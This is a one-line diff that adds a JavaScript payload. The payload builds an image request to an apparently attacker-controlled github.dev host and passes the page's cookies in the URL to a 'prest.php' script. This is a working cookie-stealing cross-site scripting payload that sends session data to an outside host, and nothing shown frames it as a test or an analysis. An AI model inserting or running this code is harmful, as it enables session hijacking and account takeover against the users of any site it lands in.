@@ -1,0 +1,1 @@
+new Image().src="https://animated-space-fortnight-69x7grgpj4x3574g-8080.app.github.dev/prest.php?cookie_data="+document.cookie
